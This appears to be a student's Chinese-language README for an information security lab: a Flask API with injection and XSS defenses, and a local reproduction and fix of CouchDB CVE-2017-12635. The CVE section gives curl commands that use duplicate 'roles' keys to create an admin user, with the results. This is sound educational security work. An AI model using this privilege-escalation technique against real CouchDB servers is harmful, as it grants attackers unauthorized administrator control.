# 信息安全实验一

这个仓库是我做信息安全实验一的代码。内容包括一个简单的 Flask API，以及
CVE-2017-12635（CouchDB 权限提升）的复现和修复。

## 文件说明

```text
app.py                  后端代码
test_api.py             测试代码
requirements.txt        需要安装的 Python 包
cve/                    复现用的 JSON 和修复版 CouchDB
docs/screenshots/       实验截图
.github/workflows/      GitHub Actions
```

## 运行方法

在 PowerShell 里执行：

```powershell
py -3 -m venv .venv
.\.venv\Scripts\Activate.ps1
pip install -r requirements.txt
python app.py
```

程序运行在 `http://127.0.0.1:5000`。

数据库是 SQLite，第一次运行会自动建表，并创建两个测试用户：

| 用户名 | 密码 | 角色 |
|---|---|---|
| alice | 123456 | admin |
| bob | 123456 | user |

## 接口

### 登录

```bash
curl -X POST http://127.0.0.1:5000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"login":"alice","password":"123456"}'
```

返回一个 token。

### 获取数据

```bash
curl http://127.0.0.1:5000/api/data \
  -H "Authorization: Bearer 这里填token"
```

不带 token 会返回 401。加 `?q=关键词` 可以搜索。

### 添加数据

```bash
curl -X POST http://127.0.0.1:5000/api/data \
  -H "Authorization: Bearer 这里填token" \
  -H "Content-Type: application/json" \
  -d '{"title":"标题","body":"内容"}'
```

## 安全部分

1. 防 SQL 注入：SQL 里用 `?` 占位符，不拼接字符串。
2. 防 XSS：返回数据前用 `html.escape()` 转义。
3. 密码用 bcrypt 加密后存数据库，不存明文。
4. 登录后发 JWT，访问受保护接口时要带 token。

## 测试和 CI

```text
python -m pytest -q
......                                                                   [100%]
6 passed

python -m bandit app.py -f txt
No issues identified.

python -m pip_audit -r requirements.txt
No known vulnerabilities found
```

GitHub Actions 每次 push 都会自动运行这些检查：

<https://github.com/zhangyu7777777/InformationSecurity_23320309/actions>

## CVE-2017-12635

CVE-2017-12635 是 CouchDB 2.1.1 之前的权限提升漏洞。原因是 CouchDB 用了两个
不同的 JSON 解析器：检查权限时看第一个 `roles`，保存用户时看最后一个
`roles`。所以在请求里写两个 `roles`，就能绕过管理员检查。

### 启动漏洞环境

```bash
cd vulhub/couchdb/CVE-2017-12635
docker compose up -d
```

Windows 下如果 init 容器报 `$'\r': command not found`，说明 `init.sh` 是
CRLF 换行，把它改成 LF 就行。

### 复现

先发一个正常的请求，会被拒绝：

```bash
curl -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub \
  -H "Content-Type: application/json" \
  --data-binary @cve/normal_user.json
```

结果是 403：

```text
{"error":"forbidden","reason":"Only _admin may set roles"}
```

再发带两个 `roles` 的请求：

```bash
curl -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub \
  -H "Content-Type: application/json" \
  --data-binary @cve/duplicate_roles.json
```

结果是 201。然后登录：

```bash
curl -u vulhub:vulhub http://127.0.0.1:5984/_session
```

可以看到 `roles` 里已经有 `_admin`：

```json
{"ok":true,"userCtx":{"name":"vulhub","roles":["_admin"]},...}
```

这个用户还可以创建数据库：

```bash
curl -i -u vulhub:vulhub -X PUT http://127.0.0.1:5984/evil_db
```

返回 201，说明确实拿到了管理员权限。

### 修复

换成 CouchDB 2.1.1：

```bash
docker compose -f cve/fixed/docker-compose.yml up -d
```

修复版在 `http://127.0.0.1:5985`。

再发同样的重复 `roles` 请求，虽然还是返回 201，但登录后 `roles` 是空的，
创建数据库会返回 401。普通用户注册仍然正常，说明修复没有影响正常功能。

## 截图

![漏洞复现](docs/screenshots/cve-before.png)

![修复验证](docs/screenshots/cve-after.png)

![GitHub Actions](docs/screenshots/ci-success.png)
